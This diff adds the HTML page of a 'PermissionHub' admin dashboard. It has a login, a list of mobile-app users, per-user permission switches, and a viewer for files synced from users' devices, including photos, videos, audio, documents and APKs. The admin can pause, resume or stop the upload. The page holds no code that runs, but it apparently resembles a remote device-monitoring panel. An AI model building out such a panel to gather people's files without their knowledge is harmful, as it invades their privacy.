@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PermissionHub — Admin Dashboard</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+</head>
+<body>
+
+<!-- ═══════════════ LOGIN ═══════════════ -->
+<div id="loginPage" class="page active">
+  <div class="login-center">
+    <div class="login-card">
+      <div class="logo">
+        <div class="logo-icon">🛡️</div>
+        <h1>PermissionHub</h1>
+        <p>Admin Dashboard</p>
+      </div>
+      <form id="loginForm">
+        <div class="form-group">
+          <label>Email</label>
+          <input type="email" id="adminEmail" placeholder="admin@example.com" required />
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <div class="pass-wrap">
+            <input type="password" id="adminPass" placeholder="••••••••" required />
+            <button type="button" class="eye-btn" onclick="togglePass()">👁</button>
+          </div>
+        </div>
+        <button type="submit" class="btn-primary" id="loginBtn">Sign In</button>
+        <div id="loginError" class="error-msg hidden"></div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════ DASHBOARD ═══════════════ -->
+<div id="dashboardPage" class="page">
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <span>🛡️</span>
+      <span class="sidebar-title">PermissionHub</span>
+    </div>
+    <nav class="sidebar-nav">
+      <a href="#" class="nav-item active" data-section="users" onclick="showSection(event,'users')">
+        <span>👥</span> Users
+      </a>
+      <a href="#" class="nav-item" data-section="stats" onclick="showSection(event,'stats')">
+        <span>📊</span> Stats
+      </a>
+    </nav>
+    <div class="sidebar-footer">
+      <div class="admin-info">
+        <div class="admin-avatar" id="adminAvatarLetter">A</div>
+        <div>
+          <div id="adminName" class="admin-name">Admin</div>
+          <div id="adminEmailDisplay" class="admin-email"></div>
+        </div>
+      </div>
+      <button class="btn-logout" onclick="logout()">Sign Out</button>
+    </div>
+  </aside>
+
+  <main class="main-content">
+    <header class="topbar">
+      <div class="topbar-left">
+        <h2 id="sectionTitle">User Management</h2>
+        <span id="userCountBadge" class="badge">0 users</span>
+      </div>
+      <div class="topbar-right">
+        <div class="search-wrap">
+          <span class="search-icon">🔍</span>
+          <input type="text" id="searchInput" placeholder="Search users…" oninput="filterUsers()" />
+        </div>
+        <button class="btn-icon" onclick="loadUsers()" title="Refresh">↻</button>
+      </div>
+    </header>
+
+    <!-- Stats -->
+    <section id="statsSection" class="stats-grid hidden">
+      <div class="stat-card c-purple"><div class="stat-value" id="statTotal">0</div><div class="stat-label">Total Users</div></div>
+      <div class="stat-card c-green"><div class="stat-value" id="statPermed">0</div><div class="stat-label">Users with Permissions</div></div>
+      <div class="stat-card c-blue"><div class="stat-value" id="statFiles">0</div><div class="stat-label">Total Files Synced</div></div>
+    </section>
+
+    <!-- Users list -->
+    <section id="usersSection">
+      <div id="loadingState" class="center-state">
+        <div class="spinner"></div><p>Loading users…</p>
+      </div>
+      <div id="emptyState" class="center-state hidden">
+        <div style="font-size:60px">👤</div>
+        <p>No users yet</p>
+        <small>Users appear here after they sign up in the mobile app</small>
+      </div>
+      <div id="usersList" class="users-grid hidden"></div>
+    </section>
+  </main>
+</div>
+
+<!-- ═══════════════ PERMISSION MODAL ═══════════════ -->
+<div id="permModal" class="modal-overlay hidden" onclick="closePermModal(event)">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-user-info">
+        <div class="modal-avatar" id="permModalAvatar">U</div>
+        <div>
+          <h3 id="permModalName"></h3>
+          <span id="permModalEmail" class="modal-email"></span>
+        </div>
+      </div>
+      <button class="modal-close" onclick="closePermModal()">✕</button>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-sm green" onclick="setAllPermissions(true)">✅ Enable All</button>
+      <button class="btn-sm red"   onclick="setAllPermissions(false)">🚫 Disable All</button>
+      <button class="btn-sm purple ml-auto" onclick="savePermissions()" id="savePermBtn">💾 Save Changes</button>
+    </div>
+    <div class="permissions-grid" id="permissionsGrid"></div>
+  </div>
+</div>
+
+<!-- ═══════════════ FILES MODAL ═══════════════ -->
+<div id="filesModal" class="modal-overlay hidden" onclick="closeFilesModal(event)">
+  <div class="modal modal-wide">
+    <div class="modal-header">
+      <div class="modal-user-info">
+        <div class="modal-avatar" id="filesModalAvatar">U</div>
+        <div>
+          <h3 id="filesModalName"></h3>
+          <span id="filesModalEmail" class="modal-email"></span>
+        </div>
+      </div>
+      <button class="modal-close" onclick="closeFilesModal()">✕</button>
+    </div>
+
+    <!-- Upload control bar -->
+    <div class="upload-control-bar">
+      <div class="upload-status-wrap">
+        <span class="upload-status-dot" id="uploadStatusDot"></span>
+        <span id="uploadStatusLabel">Upload: Idle</span>
+      </div>
+      <div class="upload-ctrl-btns">
+        <button class="btn-sm green"  id="btnResume" onclick="controlUpload('running')" style="display:none">▶ Resume</button>
+        <button class="btn-sm yellow" id="btnPause"  onclick="controlUpload('paused')"  style="display:none">⏸ Pause</button>
+        <button class="btn-sm red"    id="btnStop"   onclick="controlUpload('stopped')" style="display:none">⏹ Stop</button>
+      </div>
+    </div>
+
+    <!-- File toolbar -->
+    <div class="files-toolbar">
+      <div class="filter-tabs" id="fileTypeTabs">
+        <button class="ftab active" data-type="all"      onclick="filterFiles('all',this)">All</button>
+        <button class="ftab" data-type="image"    onclick="filterFiles('image',this)">🖼 Images</button>
+        <button class="ftab" data-type="video"    onclick="filterFiles('video',this)">🎬 Videos</button>
+        <button class="ftab" data-type="audio"    onclick="filterFiles('audio',this)">🎵 Audio</button>
+        <button class="ftab" data-type="document" onclick="filterFiles('document',this)">📄 Docs</button>
+        <button class="ftab" data-type="apk"      onclick="filterFiles('apk',this)">📦 APKs</button>
+        <button class="ftab" data-type="other"    onclick="filterFiles('other',this)">📎 Other</button>
+      </div>
+      <div class="files-search-wrap">
+        <input type="text" id="filesSearchInput" placeholder="Search files…" oninput="searchFiles()" />
+        <span id="filesCountLabel" class="files-count"></span>
+      </div>
+    </div>
+
+    <!-- Files body -->
+    <div id="filesBody" class="files-body">
+      <div id="filesLoading" class="center-state">
+        <div class="spinner"></div><p>Loading files…</p>
+      </div>
+      <div id="filesEmpty" class="center-state hidden">
+        <div style="font-size:52px">📂</div>
+        <p>No files synced yet</p>
+        <small>User must tap the ☁️ sync button in the mobile app</small>
+      </div>
+      <div id="filesGrid" class="files-grid hidden"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════ IMAGE LIGHTBOX ═══════════════ -->
+<div id="lightbox" class="lightbox hidden" onclick="closeLightbox()">
+  <button class="lb-close" onclick="closeLightbox()">✕</button>
+  <button class="lb-prev" onclick="lbNav(-1,event)">❮</button>
+  <div class="lb-content">
+    <img id="lbImg" src="" alt="" />
+  </div>
+  <button class="lb-next" onclick="lbNav(1,event)">❯</button>
+  <div class="lb-info">
+    <span id="lbName"></span>
+    <a id="lbDownload" href="" target="_blank" download class="lb-dl-btn" onclick="event.stopPropagation()">⬇ Download</a>
+  </div>
+</div>
+
+<div id="toast" class="toast hidden"></div>
+
+<script src="js/app.js"></script>
+</body>
+</html>
